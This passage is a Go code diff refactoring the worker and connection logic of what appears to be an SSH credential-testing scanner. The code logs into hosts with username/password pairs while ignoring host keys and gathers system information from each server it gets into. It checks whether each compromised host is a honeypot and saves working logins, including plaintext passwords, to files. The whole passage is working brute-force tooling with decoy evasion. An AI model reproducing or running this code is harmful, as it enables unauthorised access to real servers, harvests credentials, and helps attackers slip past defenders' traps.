-	// Semaphore to limit concurrent connections per worker
-	semaphore := make(chan struct{}, CONCURRENT_PER_WORKER)
+	sem := make(chan struct{}, CONCURRENT_PER_WORKER)
 	var workerWg sync.WaitGroup
-	
 	for task := range taskQueue {
 		workerWg.Add(1)
-		semaphore <- struct{}{} // Acquire semaphore
-		
+		sem <- struct{}{}
 		go func(t SSHTask) {
 			defer workerWg.Done()
-			defer func() { <-semaphore }() // Release semaphore
-			
 			processSSHTask(t)
+			<-sem
 		}(task)
 	}
-	
-	workerWg.Wait() // Wait for all concurrent tasks to complete
+	workerWg.Wait()
 }
 
-// Process individual SSH task
 func processSSHTask(task SSHTask) {
-	// SSH connection configuration (same as original)
 	config := &ssh.ClientConfig{
-		User: task.Username,
-		Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout: time.Duration(timeout) * time.Second,
+		User: task.Username, Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: time.Duration(timeout) * time.Second,
 	}
-	
-	connectionStartTime := time.Now()
-	
-	// Test connection (same error handling as original)
+	connStartTime := time.Now()
 	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
 	if err == nil {
 		defer client.Close()
-		
-		// Create server information
 		serverInfo := &ServerInfo{
-			IP:           task.IP,
-			Port:         task.Port,
-			Username:     task.Username,
-			Password:     task.Password,
-			ResponseTime: time.Since(connectionStartTime),
-			Commands:     make(map[string]string),
+			IP: task.IP, Port: task.Port, Username: task.Username, Password: task.Password,
+			ResponseTime: time.Since(connStartTime), Commands: make(map[string]string),
 		}
-		
-		// Honeypot detector
-		detector := &HoneypotDetector{
-			TimeAnalysis:    true,
-			CommandAnalysis: true,
-			NetworkAnalysis: true,
-		}
-		
-		// Gather system information first
+		detector := &HoneypotDetector{TimeAnalysis: true, CommandAnalysis: true, NetworkAnalysis: true}
 		gatherSystemInfo(client, serverInfo)
-		
-		// Run full honeypot detection (all 9 algorithms) with valid client
 		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
-		
-		// Record result (same logic as original)
+
 		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
 		mapMutex.Lock()
 		defer mapMutex.Unlock()
@@ -834,13 +477,12 @@ func processSSHTask(task SSHTask) {
 				logSuccessfulConnection(serverInfo)
 			} else {
 				atomic.AddInt64(&stats.honeypots, 1)
-				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
-				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
-					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
+				honeypotMsg := fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n",
+					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore)
+				appendToFile(honeypotMsg, "honeypots.txt")
 			}
 		}
 	} else {
-		// Same error handling as original
 		atomic.AddInt64(&stats.errors, 1)
 	}
 }
